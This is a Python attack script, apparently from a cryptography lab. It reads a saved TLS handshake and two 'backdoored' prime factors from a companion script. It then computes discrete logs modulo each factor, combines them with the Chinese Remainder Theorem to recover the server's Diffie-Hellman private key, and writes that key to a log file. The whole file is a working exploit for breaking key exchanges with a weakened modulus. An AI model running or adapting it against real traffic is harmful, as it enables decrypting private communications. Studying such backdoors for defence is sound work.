import subprocess
import re
from sympy.ntheory import discrete_log
from sympy.ntheory.modular import crt

# Step 1: Extract Public Key (ys), Generator (g), and Prime (p) from Saved Capture

def extract_params_from_file(filename):
    try:
        with open(filename, "r") as f:
            data = f.read()
        
        # Extract Public Key (ys)
        pubkey_match = re.search(r"Pubkey \[…\]:\s*([0-9a-fA-F]+)", data)
        if not pubkey_match:
            print("[❌] Failed to extract server public key.")
            return None, None, None
        ys = int(pubkey_match.group(1), 16)

        # Extract Generator (g) - **Ensure correct match for "g: 02"**
        g_match = re.search(r"\bg:\s*([0-9a-fA-F]{1,2})\b", data)  # Match exactly 1 or 2 hex digits
        if not g_match:
            print("[❌] Failed to extract generator g.")
            return None, None, None
        g = int(g_match.group(1), 16)

        # Extract Prime (p)
        p_match = re.search(r"p \[…\]:\s*([0-9a-fA-F]+)", data)
        if not p_match:
            print("[❌] Failed to extract prime p.")
            return None, None, None
        p = int(p_match.group(1), 16)

        print(f"[🔍] Extracted Parameters:\n ys (Public Key): {ys}\n g (Generator): {g}\n p (Prime): {p}")
        return ys, g, p
    
    except FileNotFoundError:
        print("[❌] File not found. Did you save the handshake output?")
    except Exception as e:
        print(f"[❌] Error extracting parameters: {str(e)}")

    return None, None, None


# Step 2: Read Backdoored Primes
def read_backdoored_primes():
    try:
        with open("p1.txt", "r") as f:
            p1 = int(f.read().strip())
        with open("p2.txt", "r") as f:
            p2 = int(f.read().strip())
        print(f"[🔑] Loaded Backdoored Primes:\n p1: {p1}\n p2: {p2}")
        return p1, p2
    except FileNotFoundError:
        print("[❌] Missing p1.txt or p2.txt - run DH_backdoor.py first")
    except Exception as e:
        print(f"[❌] Prime read error: {str(e)}")
    return None, None

# Step 3: Compute Private Key via CRT
def compute_private_key(ys, g, p1, p2):
    try:
        print("[🔢] Computing discrete logs mod p1 and p2...")
        
        x1 = discrete_log(p1, ys % p1, g)  # Compute discrete log mod p1
        print(f"[✅] Found x1: {x1}")

        x2 = discrete_log(p2, ys % p2, g)  # Compute discrete log mod p2
        print(f"[✅] Found x2: {x2}")

        # Use the Chinese Remainder Theorem (CRT)
        x, _ = crt([p1-1, p2-1], [x1, x2])
        print(f"[✅] Recovered private key: {x}")
        return x
    
    except ValueError as e:
        print(f"[❌] Discrete log failure: {str(e)}")
    except Exception as e:
        print(f"[❌] CRT computation error: {str(e)}")
    return None

# Step 4: Save Recovered Key
def save_secret_key(key):
    try:
        with open("tls_key.log", "w") as f:
            f.write(f"Recovered DH Private Key: {key}\n")
        print(f"[✅] Key saved to tls_key.log")
    except Exception as e:
        print(f"[❌] Key save failed: {str(e)}")

# Main Execution
def main():
    print("[🚀] Breaking DH with backdoor primes...\n")
    
    # Extract parameters from saved TLS handshake file
    ys, g, p = extract_params_from_file("handshake_output.txt")
    if not ys or not g or not p:
        print("[❌] Failed to extract DH parameters.")
        return

    # Get backdoored primes
    p1, p2 = read_backdoored_primes()
    if not p1 or not p2:
        return

    # Compute private key
    print("[🧮] Calculating private key via CRT...")
    private_key = compute_private_key(ys, g, p1, p2)
    if not private_key:
        return
    
    print(f"[🔥] SUCCESS! Private key: {private_key}")
    save_secret_key(private_key)

if __name__ == "__main__":
    main()
